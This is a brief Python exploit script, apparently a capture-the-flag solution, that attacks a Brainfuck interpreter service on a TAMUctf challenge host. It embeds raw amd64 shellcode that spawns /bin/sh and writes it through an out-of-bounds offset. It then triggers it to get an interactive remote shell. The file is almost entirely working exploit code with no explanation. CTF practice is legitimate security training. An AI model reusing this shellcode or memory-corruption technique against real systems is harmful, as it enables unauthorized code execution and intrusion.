from pwn import *
from brainfuck_exploiter import BrainfuckExploiter

context.arch = "amd64"

shell = '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05'

def main():
	r = remote('challenges.tamuctf.com', 31337)
	r.recvuntil('bf$ ')
	exploiter = BrainfuckExploiter(r)
	exploiter.write(-13, shell)
	exploiter.run()
	exploiter.interactive()


if __name__ == '__main__':
	main()